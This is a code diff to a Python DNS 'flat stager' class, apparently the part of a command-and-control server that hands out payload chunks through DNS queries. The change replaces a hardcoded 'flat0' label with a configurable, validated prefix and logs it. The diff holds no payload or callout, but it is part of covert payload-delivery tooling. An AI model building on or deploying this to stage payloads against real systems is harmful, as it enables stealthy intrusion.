@@ -14,10 +14,11 @@ from ...logging_util import log_event
 
 
 class DnsFlatStager(object):
-    def __init__(self, base_domain, stager_nonce, flat_chunks, flat_count,
-                 flat_meta, flat_chunk_size, rtype, cname_suffix, label_max_len,
-                 logger, send_response, send_empty_response):
+    def __init__(self, base_domain, stager_prefix, stager_nonce, flat_chunks,
+                 flat_count, flat_meta, flat_chunk_size, rtype, cname_suffix,
+                 label_max_len, logger, send_response, send_empty_response):
         self._base_domain = base_domain
+        self._stager_prefix = stager_prefix
         self._stager_nonce = stager_nonce
         self._flat_chunks = flat_chunks
         requested_count = flat_count
@@ -41,6 +42,7 @@ class DnsFlatStager(object):
         self._send_empty_response = send_empty_response
         self._enabled = bool(self._flat_chunks and self._flat_count)
         if self._enabled:
+            self._stager_prefix = self._normalize_stager_prefix(self._stager_prefix)
             self._stager_nonce = self._normalize_stager_nonce(self._stager_nonce)
             meta_count = self._parse_flat_meta_count(self._flat_meta)
             log_event(
@@ -49,6 +51,7 @@ class DnsFlatStager(object):
                 'dns.flat_stager_init',
                 'DNS flat stager initialized',
                 lambda: {
+                    'prefix': self._stager_prefix,
                     'nonce': self._stager_nonce,
                     'requested_count': requested_count,
                     'flat_count': self._flat_count,
@@ -79,11 +82,15 @@ class DnsFlatStager(object):
                 self._flat_meta = struct.pack(
                     '>2sBI', b'SF', 1, self._flat_count
                 )
-            self._flat_count_name = 'flat0.%s.count.%s' % (
+            self._flat_count_name = '%s.%s.count.%s' % (
+                self._stager_prefix,
                 self._stager_nonce,
                 self._base_domain,
             )
-            self._flat_piece_prefix = 'flat0.%s.' % self._stager_nonce
+            self._flat_piece_prefix = '%s.%s.' % (
+                self._stager_prefix,
+                self._stager_nonce,
+            )
             self._flat_piece_suffix = '.%s' % self._base_domain
         else:
             self._flat_count_name = None
@@ -125,6 +132,32 @@ class DnsFlatStager(object):
         if DnsFlatStager._is_base32_label(value):
             raise ValueError(
                 'dns_stager_nonce must include non-base32 characters'
+            )
+        return value.lower()
+
+    @staticmethod
+    def _normalize_stager_prefix(value):
+        if not value:
+            raise ValueError('dns_stager_prefix required for DNS flat stager')
+        if isinstance(value, bytes):
+            try:
+                value = value.decode('ascii')
+            except UnicodeError:
+                raise ValueError('dns_stager_prefix must be ASCII')
+        value = value.strip().strip('.')
+        if not value:
+            raise ValueError('dns_stager_prefix required for DNS flat stager')
+        try:
+            value.encode('ascii')
+        except UnicodeError:
+            raise ValueError('dns_stager_prefix must be ASCII')
+        if '.' in value:
+            raise ValueError('dns_stager_prefix must be a single label')
+        if len(value) > 63:
+            raise ValueError('dns_stager_prefix must be <= 63 characters')
+        if DnsFlatStager._is_base32_label(value):
+            raise ValueError(
+                'dns_stager_prefix must include non-base32 characters'
             )
         return value.lower()
 
